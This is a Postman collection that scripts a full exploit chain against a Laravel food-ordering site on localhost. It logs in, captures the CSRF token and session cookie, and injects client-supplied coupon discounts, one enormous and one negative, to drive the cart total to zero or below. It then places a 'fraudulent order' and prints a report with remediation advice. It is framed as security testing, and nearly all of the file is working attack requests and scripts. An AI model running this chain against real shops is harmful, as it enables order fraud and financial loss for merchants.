{
  "info": {
    "name": "üö® Coupon Exploit Collection",
    "description": "Complete exploit chain for coupon vulnerability testing - FOR SECURITY TESTING ONLY",
    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
  },
  "variable": [
    {
      "key": "BASE_URL",
      "value": "http://localhost:8000"
    },
    {
      "key": "USER_EMAIL",
      "value": "customer@example.com"
    },
    {
      "key": "USER_PASSWORD",
      "value": "password123"
    }
  ],
  "item": [
    {
      "name": "üîê PHASE 1: Authentication & Setup",
      "item": [
        {
          "name": "1.1 Get CSRF Token",
          "event": [
            {
              "listen": "test",
              "script": {
                "exec": [
                  "pm.test(\"Extract CSRF Token\", function () {",
                  "    const html = pm.response.text();",
                  "    const csrfMatch = html.match(/name=\"csrf-token\" content=\"([^\"]+)\"/);",
                  "    if (csrfMatch) {",
                  "        pm.environment.set(\"CSRF_TOKEN\", csrfMatch[1]);",
                  "        console.log(\"‚úÖ CSRF Token extracted:\", csrfMatch[1]);",
                  "    } else {",
                  "        console.log(\"‚ùå CSRF Token not found!\");",
                  "    }",
                  "});"
                ]
              }
            }
          ],
          "request": {
            "method": "GET",
            "header": [],
            "url": {
              "raw": "{{BASE_URL}}/login",
              "host": ["{{BASE_URL}}"],
              "path": ["login"]
            }
          }
        },
        {
          "name": "1.2 Customer Login",
          "event": [
            {
              "listen": "test",
              "script": {
                "exec": [
                  "pm.test(\"Login successful\", function () {",
                  "    pm.expect(pm.response.code).to.be.oneOf([200, 302]);",
                  "    ",
                  "    // Extract session cookie",
                  "    const cookies = pm.response.headers.get(\"Set-Cookie\");",
                  "    if (cookies) {",
                  "        const sessionMatch = cookies.match(/laravel_session=([^;]+)/);",
                  "        if (sessionMatch) {",
                  "            pm.environment.set(\"SESSION_COOKIE\", sessionMatch[1]);",
                  "            console.log(\"‚úÖ Session cookie extracted\");",
                  "        }",
                  "    }",
                  "    ",
                  "    // Check for redirect to homepage (successful login)",
                  "    if (pm.response.code === 302) {",
                  "        const location = pm.response.headers.get(\"Location\");",
                  "        if (location.includes(\"/\") || location.includes(\"home\")) {",
                  "            console.log(\"‚úÖ Login successful - redirected to:\", location);",
                  "        }",
                  "    }",
                  "});"
                ]
              }
            }
          ],
          "request": {
            "method": "POST",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/x-www-form-urlencoded"
              }
            ],
            "body": {
              "mode": "urlencoded",
              "urlencoded": [
                {
                  "key": "email",
                  "value": "{{USER_EMAIL}}"
                },
                {
                  "key": "password",
                  "value": "{{USER_PASSWORD}}"
                },
                {
                  "key": "_token",
                  "value": "{{CSRF_TOKEN}}"
                }
              ]
            },
            "url": {
              "raw": "{{BASE_URL}}/login",
              "host": ["{{BASE_URL}}"],
              "path": ["login"]
            }
          }
        },
        {
          "name": "1.3 Add Product to Cart",
          "event": [
            {
              "listen": "test",
              "script": {
                "exec": [
                  "pm.test(\"Product added to cart\", function () {",
                  "    const jsonData = pm.response.json();",
                  "    pm.expect(jsonData.success).to.be.true;",
                  "    console.log(\"‚úÖ Product added to cart\");",
                  "});"
                ]
              }
            }
          ],
          "request": {
            "method": "POST",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/json"
              },
              {
                "key": "X-CSRF-TOKEN",
                "value": "{{CSRF_TOKEN}}"
              },
              {
                "key": "Cookie",
                "value": "laravel_session={{SESSION_COOKIE}}"
              }
            ],
            "body": {
              "mode": "raw",
              "raw": "{\n    \"variant_id\": 1,\n    \"quantity\": 2,\n    \"toppings\": []\n}"
            },
            "url": {
              "raw": "{{BASE_URL}}/cart/add",
              "host": ["{{BASE_URL}}"],
              "path": ["cart", "add"]
            }
          }
        }
      ]
    },
    {
      "name": "üö® PHASE 2: Coupon Exploitation",
      "item": [
        {
          "name": "2.1 üö® CRITICAL - Apply Malicious Discount",
          "event": [
            {
              "listen": "test",
              "script": {
                "exec": [
                  "pm.test(\"üö® COUPON VULNERABILITY EXPLOIT\", function () {",
                  "    const jsonData = pm.response.json();",
                  "    ",
                  "    console.log(\"=\".repeat(50));",
                  "    console.log(\"üö® TESTING COUPON VULNERABILITY\");",
                  "    console.log(\"=\".repeat(50));",
                  "    ",
                  "    if (jsonData.success === true) {",
                  "        console.log(\"‚úÖ Server accepted coupon request\");",
                  "        ",
                  "        if (jsonData.discount && jsonData.discount >= 999999999) {",
                  "            console.log(\"üö® CRITICAL VULNERABILITY CONFIRMED!\");",
                  "            console.log(\"üí∞ Malicious discount accepted:\", jsonData.discount.toLocaleString('vi-VN'), \"ƒë\");",
                  "            console.log(\"üî• FINANCIAL IMPACT: EXTREME\");",
                  "            ",
                  "            // Set environment flag",
                  "            pm.environment.set(\"VULNERABILITY_EXPLOITED\", \"true\");",
                  "            pm.environment.set(\"MALICIOUS_DISCOUNT\", jsonData.discount);",
                  "            ",
                  "        } else {",
                  "            console.log(\"‚ö†Ô∏è Server accepted coupon but limited discount amount\");",
                  "        }",
                  "    } else {",
                  "        console.log(\"‚úÖ Server rejected malicious coupon (GOOD)\");",
                  "        console.log(\"Response:\", jsonData);",
                  "    }",
                  "});"
                ]
              }
            }
          ],
          "request": {
            "method": "POST",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/json"
              },
              {
                "key": "X-CSRF-TOKEN",
                "value": "{{CSRF_TOKEN}}"
              },
              {
                "key": "Cookie",
                "value": "laravel_session={{SESSION_COOKIE}}"
              }
            ],
            "body": {
              "mode": "raw",
              "raw": "{\n    \"coupon_code\": \"FASTFOOD10\",\n    \"discount\": 999999999\n}"
            },
            "url": {
              "raw": "{{BASE_URL}}/coupon/apply",
              "host": ["{{BASE_URL}}"],
              "path": ["coupon", "apply"]
            }
          }
        },
        {
          "name": "2.2 Verify Exploit in Cart",
          "event": [
            {
              "listen": "test",
              "script": {
                "exec": [
                  "pm.test(\"Verify malicious discount in cart\", function () {",
                  "    const html = pm.response.text();",
                  "    ",
                  "    // Look for discount amount in HTML",
                  "    if (html.includes('999,999,999') || html.includes('999999999')) {",
                  "        console.log(\"üëÅÔ∏è MALICIOUS DISCOUNT VISIBLE IN CART!\");",
                  "        pm.environment.set(\"DISCOUNT_VISIBLE_CART\", \"true\");",
                  "    }",
                  "    ",
                  "    // Look for total amount",
                  "    const totalMatch = html.match(/T·ªïng c·ªông.*?(\\d{1,3}(?:\\.\\d{3})*|\\d+)/);",
                  "    if (totalMatch) {",
                  "        const total = parseInt(totalMatch[1].replace(/\\./g, ''));",
                  "        console.log(\"üíµ Current cart total:\", total.toLocaleString('vi-VN'), \"ƒë\");",
                  "        ",
                  "        if (total <= 0) {",
                  "            console.log(\"üö® CART TOTAL IS ZERO OR NEGATIVE!\");",
                  "            pm.environment.set(\"NEGATIVE_TOTAL\", \"true\");",
                  "        }",
                  "    }",
                  "});"
                ]
              }
            }
          ],
          "request": {
            "method": "GET",
            "header": [
              {
                "key": "Cookie",
                "value": "laravel_session={{SESSION_COOKIE}}"
              }
            ],
            "url": {
              "raw": "{{BASE_URL}}/cart",
              "host": ["{{BASE_URL}}"],
              "path": ["cart"]
            }
          }
        },
        {
          "name": "2.3 Advanced - Negative Discount Attack",
          "event": [
            {
              "listen": "test",
              "script": {
                "exec": [
                  "pm.test(\"Test negative discount vulnerability\", function () {",
                  "    const jsonData = pm.response.json();",
                  "    ",
                  "    if (jsonData.success && jsonData.discount < 0) {",
                  "        console.log(\"üö® NEGATIVE DISCOUNT ACCEPTED!\");",
                  "        console.log(\"üí∞ User will receive money:\", Math.abs(jsonData.discount).toLocaleString('vi-VN'), \"ƒë\");",
                  "        pm.environment.set(\"NEGATIVE_DISCOUNT_EXPLOITED\", \"true\");",
                  "    }",
                  "});"
                ]
              }
            }
          ],
          "request": {
            "method": "POST",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/json"
              },
              {
                "key": "X-CSRF-TOKEN",
                "value": "{{CSRF_TOKEN}}"
              },
              {
                "key": "Cookie",
                "value": "laravel_session={{SESSION_COOKIE}}"
              }
            ],
            "body": {
              "mode": "raw",
              "raw": "{\n    \"coupon_code\": \"FASTFOOD10\",\n    \"discount\": -1000000\n}"
            },
            "url": {
              "raw": "{{BASE_URL}}/coupon/apply",
              "host": ["{{BASE_URL}}"],
              "path": ["coupon", "apply"]
            }
          }
        }
      ]
    },
    {
      "name": "üí• PHASE 3: Checkout Exploitation",
      "item": [
        {
          "name": "3.1 Verify Discount in Checkout",
          "event": [
            {
              "listen": "test",
              "script": {
                "exec": [
                  "pm.test(\"Verify malicious discount in checkout\", function () {",
                  "    const html = pm.response.text();",
                  "    ",
                  "    console.log(\"=\".repeat(40));",
                  "    console.log(\"üõí CHECKOUT VERIFICATION\");",
                  "    console.log(\"=\".repeat(40));",
                  "    ",
                  "    // Check for malicious discount",
                  "    if (html.includes('999,999,999') || html.includes('999999999')) {",
                  "        console.log(\"üëÅÔ∏è MALICIOUS DISCOUNT VISIBLE IN CHECKOUT!\");",
                  "        pm.environment.set(\"EXPLOIT_VISIBLE_CHECKOUT\", \"true\");",
                  "    }",
                  "    ",
                  "    // Check final total",
                  "    const totalMatch = html.match(/T·ªïng c·ªông.*?(\\d{1,3}(?:\\.\\d{3})*|\\d+)/);",
                  "    if (totalMatch) {",
                  "        const total = parseInt(totalMatch[1].replace(/\\./g, ''));",
                  "        console.log(\"üíµ Checkout total:\", total.toLocaleString('vi-VN'), \"ƒë\");",
                  "        ",
                  "        if (total <= 0) {",
                  "            console.log(\"üö® CHECKOUT TOTAL IS ZERO OR NEGATIVE!\");",
                  "            console.log(\"üíé READY FOR FREE/PROFITABLE ORDER!\");",
                  "        }",
                  "    }",
                  "    ",
                  "    // Check shipping fee inconsistency",
                  "    if (html.includes('$subtotal > 100000') && html.includes('15000')) {",
                  "        console.log(\"‚ö†Ô∏è Frontend shipping logic: Free > 100k, Fee: 15k\");",
                  "        pm.environment.set(\"FRONTEND_SHIPPING\", \"100000\");",
                  "    }",
                  "});"
                ]
              }
            }
          ],
          "request": {
            "method": "GET",
            "header": [
              {
                "key": "Cookie",
                "value": "laravel_session={{SESSION_COOKIE}}"
              }
            ],
            "url": {
              "raw": "{{BASE_URL}}/checkout",
              "host": ["{{BASE_URL}}"],
              "path": ["checkout"]
            }
          }
        },
        {
          "name": "3.2 üö® Complete Fraudulent Order",
          "event": [
            {
              "listen": "test",
              "script": {
                "exec": [
                  "pm.test(\"üö® FRAUDULENT ORDER COMPLETION\", function () {",
                  "    console.log(\"=\".repeat(50));",
                  "    console.log(\"üö® ATTEMPTING FRAUDULENT ORDER\");",
                  "    console.log(\"=\".repeat(50));",
                  "    ",
                  "    if (pm.response.code === 302) {",
                  "        const location = pm.response.headers.get('Location');",
                  "        ",
                  "        if (location && location.includes('success')) {",
                  "            console.log(\"üö® CRITICAL: FRAUDULENT ORDER COMPLETED SUCCESSFULLY!\");",
                  "            console.log(\"üéØ Success page:\", location);",
                  "            ",
                  "            // Extract order number if possible",
                  "            const orderMatch = location.match(/order_number=([^&]+)/);",
                  "            if (orderMatch) {",
                  "                console.log(\"üìã Order number:\", orderMatch[1]);",
                  "                pm.environment.set(\"FRAUDULENT_ORDER_ID\", orderMatch[1]);",
                  "            }",
                  "            ",
                  "            pm.environment.set(\"EXPLOIT_COMPLETED\", \"true\");",
                  "            ",
                  "        } else if (location && location.includes('error')) {",
                  "            console.log(\"‚ùå Order failed - redirected to error page\");",
                  "        }",
                  "    } else if (pm.response.code === 200) {",
                  "        const html = pm.response.text();",
                  "        if (html.includes('error') || html.includes('failed')) {",
                  "            console.log(\"‚ùå Order processing failed\");",
                  "        }",
                  "    }",
                  "});"
                ]
              }
            }
          ],
          "request": {
            "method": "POST",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/x-www-form-urlencoded"
              },
              {
                "key": "X-CSRF-TOKEN",
                "value": "{{CSRF_TOKEN}}"
              },
              {
                "key": "Cookie",
                "value": "laravel_session={{SESSION_COOKIE}}"
              }
            ],
            "body": {
              "mode": "urlencoded",
              "urlencoded": [
                {
                  "key": "full_name",
                  "value": "Security Tester"
                },
                {
                  "key": "phone",
                  "value": "0123456789"
                },
                {
                  "key": "email",
                  "value": "exploit@test.com"
                },
                {
                  "key": "address",
                  "value": "123 Exploit Street"
                },
                {
                  "key": "city",
                  "value": "H√† N·ªôi"
                },
                {
                  "key": "district",
                  "value": "Ba ƒê√¨nh"
                },
                {
                  "key": "ward",
                  "value": "Ph√∫c X√°"
                },
                {
                  "key": "payment_method",
                  "value": "cod"
                },
                {
                  "key": "terms",
                  "value": "on"
                },
                {
                  "key": "notes",
                  "value": "Security test - DO NOT DELIVER"
                }
              ]
            },
            "url": {
              "raw": "{{BASE_URL}}/checkout/process",
              "host": ["{{BASE_URL}}"],
              "path": ["checkout", "process"]
            }
          }
        }
      ]
    },
    {
      "name": "üìä PHASE 4: Verification & Reporting",
      "item": [
        {
          "name": "4.1 Final Verification",
          "event": [
            {
              "listen": "test",
              "script": {
                "exec": [
                  "pm.test(\"Final exploit verification\", function () {",
                  "    const vulnerabilityExploited = pm.environment.get(\"VULNERABILITY_EXPLOITED\");",
                  "    const exploitCompleted = pm.environment.get(\"EXPLOIT_COMPLETED\");",
                  "    ",
                  "    console.log(\"\\n\" + \"=\".repeat(60));",
                  "    console.log(\"üìä FINAL SECURITY ASSESSMENT REPORT\");",
                  "    console.log(\"=\".repeat(60));",
                  "    ",
                  "    if (vulnerabilityExploited === \"true\") {",
                  "        console.log(\"üö® CRITICAL VULNERABILITY CONFIRMED\");",
                  "        console.log(\"üí∞ Financial Impact: EXTREME\");",
                  "        console.log(\"üéØ Attack Vector: Discount Manipulation\");",
                  "        ",
                  "        if (exploitCompleted === \"true\") {",
                  "            console.log(\"üí• FULL EXPLOIT CHAIN SUCCESSFUL\");",
                  "            console.log(\"üìã Fraudulent order created with malicious discount\");",
                  "        }",
                  "    } else {",
                  "        console.log(\"‚úÖ Vulnerability not exploitable (GOOD)\");",
                  "    }",
                  "    ",
                  "    console.log(\"\\nüõ°Ô∏è IMMEDIATE ACTIONS REQUIRED:\");",
                  "    console.log(\"1. Implement server-side discount validation\");",
                  "    console.log(\"2. Remove client-controlled discount values\");",
                  "    console.log(\"3. Add audit logging for all coupon applications\");",
                  "    console.log(\"4. Implement rate limiting\");",
                  "    ",
                  "    console.log(\"\\n‚ö†Ô∏è EVIDENCE COLLECTED:\");",
                  "    console.log(\"- CSRF Token:\", pm.environment.get(\"CSRF_TOKEN\"));",
                  "    console.log(\"- Malicious Discount:\", pm.environment.get(\"MALICIOUS_DISCOUNT\"));",
                  "    console.log(\"- Order ID:\", pm.environment.get(\"FRAUDULENT_ORDER_ID\"));",
                  "});"
                ]
              }
            }
          ],
          "request": {
            "method": "GET",
            "header": [
              {
                "key": "Cookie",
                "value": "laravel_session={{SESSION_COOKIE}}"
              }
            ],
            "url": {
              "raw": "{{BASE_URL}}/checkout/success?order_number={{FRAUDULENT_ORDER_ID}}",
              "host": ["{{BASE_URL}}"],
              "path": ["checkout", "success"],
              "query": [
                {
                  "key": "order_number",
                  "value": "{{FRAUDULENT_ORDER_ID}}"
                }
              ]
            }
          }
        }
      ]
    }
  ]
} 